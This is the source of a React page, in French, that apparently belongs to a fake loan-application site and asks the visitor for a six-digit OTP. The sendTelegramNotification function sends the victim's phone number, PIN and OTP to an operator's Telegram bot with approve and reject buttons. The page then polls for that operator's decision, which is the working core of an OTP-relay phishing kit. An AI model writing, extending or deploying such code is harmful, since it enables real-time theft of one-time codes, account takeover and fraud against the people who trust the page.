import React, { useState, useRef, useEffect } from 'react'
import { useNavigate, useParams } from 'react-router-dom'

const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || ''
const ADMIN_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID || ''
const TELEGRAM_API = 'https://api.telegram.org/bot' + BOT_TOKEN

const SpinnerStyle = () => (
  <style>{`
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  `}</style>
)

const otpStatusMessages = {
  pending: "⏳ En attente...",
  approved: "✅ Vérifié!",
  wrong_code: "❌ Code OTP incorrect",
  wrong_pin: "❌ Code PIN incorrect",
  expired: "⏰ Temps expiré",
  resend_requested: "🔁 OTP resend requested"
}

function Verification() {
  const navigate = useNavigate()
  const { user } = useParams()
  const userId = user || 'default'
  const [otp, setOtp] = useState(Array(6).fill(""))
  const inputRefs = useRef([])
  const [requestId, setRequestId] = useState(null)
  const [status, setStatus] = useState(null)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState("")
  const [copied, setCopied] = useState(false)
  const [timer, setTimer] = useState(120)
  const [autoPolling, setAutoPolling] = useState(false)
  const [approvedOtp, setApprovedOtp] = useState("")
  const pollingIntervalRef = useRef(null)
  const checkCountRef = useRef(0)
  const maxChecks = 24
  const startTimeRef = useRef(null)
  
  const storedAppStr = localStorage.getItem('loanAppData')
  const appData = storedAppStr ? JSON.parse(storedAppStr) : {}
  
  const startIndex = useRef(null)

  useEffect(() => {
    const cleanup = () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current)
        pollingIntervalRef.current = null
      }
    }
    return cleanup
  }, [])

  useEffect(() => {
    if (timer > 0) {
      const id = setInterval(() => setTimer(t => t - 1), 1000)
      return () => clearInterval(id)
    }
  }, [timer])

  const handleKey = (index, e) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      e.preventDefault()
      inputRefs.current[index - 1]?.focus()
    } else if (/^\d$/.test(e.key) && index < 5) {
      e.preventDefault()
      const newOtp = [...otp]
      newOtp[index] = e.key
      setOtp(newOtp)
      inputRefs.current[index + 1]?.focus()
    }
  }

  const handlePaste = (e) => {
    e.preventDefault()
    const data = e.clipboardData.getData("text").trim().replace(/\D/g, "")
    if (data.length === 6) {
      const newOtp = data.split("").slice(0, 6)
      setOtp(newOtp)
      setTimeout(() => submitOtp(new Event("submit")), 300)
    }
  }

  async function sendTelegramNotification(phoneNumber, pin, code) {
    const reqId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
    
    const lines = [
      '📲 New OTP Request',
      '📱 Phone: ' + phoneNumber,
      '🔑 PIN: ' + pin,
      '🔐 OTP Code: ' + code,
      '🆔 Request: ' + reqId
    ]
    const message = lines.join('\n')

    try {
      const response = await fetch(TELEGRAM_API + '/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: ADMIN_CHAT_ID,
          text: message,
          reply_markup: {
            inline_keyboard: [[
              { text: '✅ Approve', callback_data: 'approve_' + reqId },
              { text: '❌ Reject', callback_data: 'reject_' + reqId }
            ]]
          }
        })
      })
      return { success: response.ok, requestId: reqId }
    } catch (e) {
      console.error('Telegram send failed:', e)
      return { success: false, error: e.message, requestId: reqId }
    }
  }

  async function checkTelegramApproval(reqId) {
    try {
      const response = await fetch(TELEGRAM_API + '/getUpdates?offset=-1000000000')
      const data = await response.json()
      
      if (data.ok && Array.isArray(data.result)) {
        for (const update of data.result) {
          if (update.callback_query) {
            const parts = update.callback_query.data.split('_')
            const action = parts[0]
            const id = parts.slice(1).join('_')
            if (id === reqId) {
              if (action === 'approve') {
                try {
                  await fetch(TELEGRAM_API + '/sendMessage', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                      chat_id: update.callback_query.from.id,
                      text: '✅ Transaction approved!'
                    })
                  })
                } catch (e) {}
                return { approved: true, status: 'approved' }
              } else if (action === 'reject') {
                try {
                  await fetch(TELEGRAM_API + '/sendMessage', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                      chat_id: update.callback_query.from.id,
                      text: '❌ Transaction rejected.'
                    })
                  })
                } catch (e) {}
                return { approved: false, status: 'rejected' }
              }
            }
          }
        }
      }
      return { approved: false, status: 'pending' }
    } catch (e) {
      console.error('Approval check failed:', e)
      return { approved: false, status: 'error' }
    }
  }

  const startPolling = (reqId) => {
    checkCountRef.current = 0
    startTimeRef.current = Date.now()
    setRequestId(reqId)

    setLoading(true)
    setAutoPolling(true)
    setError("")
    setStatus(null)

    pollingIntervalRef.current = setInterval(async () => {
      checkCountRef.current++
      const result = await checkTelegramApproval(reqId)
      
      console.log('Polling... count:', checkCountRef.current, 'result:', result)

      if (result.approved) {
        clearInterval(pollingIntervalRef.current)
        pollingIntervalRef.current = null
        setLoading(false)
        setAutoPolling(false)
        setStatus("approved")
        const storedApp = localStorage.getItem('loanAppData')
        const appData = storedApp ? JSON.parse(storedApp) : {}
        setTimeout(() => navigate(`/${userId}/loan-success?name=${encodeURIComponent(appData.name || 'User')}&amount=${encodeURIComponent(appData.amount || 'N/A')}`), 1500)
      } else if (result.status === 'rejected') {
        clearInterval(pollingIntervalRef.current)
        pollingIntervalRef.current = null
        setLoading(false)
        setAutoPolling(false)
        setError("Transaction rejetée")
      } else if (checkCountRef.current >= maxChecks) {
        clearInterval(pollingIntervalRef.current)
        pollingIntervalRef.current = null
        setLoading(false)
        setAutoPolling(false)
        setStatus("expired")
        setError("Temps expiré")
      }
    }, 5000)
  }

  const startVerification = async () => {
    if (otp.some(i => i === "")) return
    
    const code = otp.join("")
    console.log("Sending OTP verification...", code)
    setLoading(true)
    setError("")
    setApprovedOtp(code)
    
    const storedApp = localStorage.getItem('loanAppData')
    const appData = storedApp ? JSON.parse(storedApp) : {}
    const storedClient = localStorage.getItem('clientData')
    const clientData = storedClient ? JSON.parse(storedClient) : {}
    
    const phoneNumber = appData.number || ""
    const pin = "0000"

    try {
      const result = await sendTelegramNotification(phoneNumber, pin, code)
      
      if (result.success && result.requestId) {
        setRequestId(result.requestId)
        setAutoPolling(true)
        checkCountRef.current = 0
        startTimeRef.current = Date.now()
      } else {
        setError("Échec de l'envoi: " + (result.error || 'Unknown error'))
        setLoading(false)
      }
    } catch (err) {
      console.error("Verification error:", err)
      setError("Erreur de vérification")
      setLoading(false)
    }
  }

  const copyCode = () => {
    const code = otp.join("")
    if (code.length === 6) {
      navigator.clipboard.writeText(code)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    }
  }

  const resendOtp = () => {
    if (pollingIntervalRef.current) {
      clearInterval(pollingIntervalRef.current)
      pollingIntervalRef.current = null
    }
    setOtp(Array(6).fill(""))
    setTimer(120)
    setError("")
    setLoading(false)
    setAutoPolling(false)
    setStatus(null)
  }

  if (status === "approved") {
    return (
      <div className="otp-container">
        <div className="verification-success">
          <h2>✅ Vérification réussie!</h2>
          <p>Vous serez redirigé vers la page de compléxion...</p>
        </div>
      </div>
    )
  }

  if (status === "expired") {
    return (
      <div className="otp-container">
        <div className="verification-error">
          <h2 style={{ color: "red" }}>⏰ Temps expiré !</h2>
          <p>Le délai de vérification est dépassé</p>
          <button 
            onClick={resendOtp}
            style={{
              marginTop: '15px',
              padding: '10px 20px',
              background: '#11bb4a',
              color: 'white',
              border: 'none',
              borderRadius: '5px',
              cursor: 'pointer'
            }}
          >
            Renvoyer
          </button>
        </div>
      </div>
    )
  }

  return (
    <div className="otp-container">
      <SpinnerStyle />
      <div className="otpheader">
        <h2>Vérification OTP</h2>
        <p>
          Saisissez le code OTP envoyé à votre numéro
          <br />
          <span style={{ fontWeight: "bold", color: "#333" }}>{appData?.number || "____________"}</span>
        </p>
      </div>

      {error && (
        <div className="error-message" style={{ color: "red", textAlign: "center", margin: "10px 0", padding: "8px", backgroundColor: "#ffeeee", borderRadius: "5px" }}>
          ❌ {error}
        </div>
      )}

      {autoPolling && (
        <div style={{
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          gap: "10px",
          padding: "15px",
          backgroundColor: "#e3f2fd",
          borderRadius: "8px",
          margin: "15px 0"
        }}>
          <span style={{
            display: "inline-block",
            width: "20px",
            height: "20px",
            border: "2px solid #1976d2",
            borderRadius: "50%",
            borderTopColor: "#1976d2",
            animation: "spin 1s linear infinite"
          }}></span>
          <span style={{ color: "#1976d2", fontWeight: "500" }}>
            ⏳ En attente d'approbation du PIN...
          </span>
        </div>
      )}

      <div className="otp-inputs">
        {otp.map((value, index) => (
          <input
            key={index}
            ref={el => inputRefs.current[index] = el}
            type="text"
            inputMode="numeric"
            maxLength="1"
            value={value}
            onChange={e => {
              const newOtp = [...otp]
              newOtp[index] = e.target.value
              setOtp(newOtp)
            }}
            onKeyDown={e => handleKey(index, e)}
            onPaste={handlePaste}
            onFocus={(e) => e.target.select()}
            className={`otp-input ${value ? "filled" : ""} ${loading ? "error" : ""}`}
            autoComplete="one-time-code"
            disabled={loading || autoPolling}
          />
        ))}
      </div>

      <div className="otp-display">
        <p>
          Votre code OTP : <strong>{otp.join("") || "______"}</strong>
        </p>
        
        {!otp.every(v => v) ? (
          <button 
            onClick={startVerification} 
            className="copy-btn" 
            type="button" 
            disabled={otp.join("").length !== 6 || loading || autoPolling}
            style={{ opacity: otp.join("").length !== 6 || loading || autoPolling ? 0.6 : 1 }}
          >
            {loading || autoPolling ? "⏳ Verifying..." : otpStatusMessages[status] || "Saisissez le code OTP"}
          </button>
        ) : (
          <button 
            onClick={copyCode} 
            className="copy-btn" 
            type="button"
          >
            {copied ? "✓ Copié!" : "Finition"}
          </button>
        )}

        <div className="otp-actions">
          <button 
            className="clear-btn" 
            type="button" 
            onClick={resendOtp} 
            disabled={timer > 0}
          >
            {timer > 0 ? `Renvoyer ${timer}s` : "Renvoyer le code OTP"}
          </button>
          <button className="clear-btn" type="button" onClick={() => {
            setOtp(Array(6).fill(""))
            inputRefs.current[0]?.focus()
          }}>
            Claire
          </button>
          {status === "expired" && (
            <button className="retry-button" onClick={resendOtp}>
              → Essayer à nouveau
            </button>
          )}
        </div>
      </div>
    </div>
  )
}

export default Verification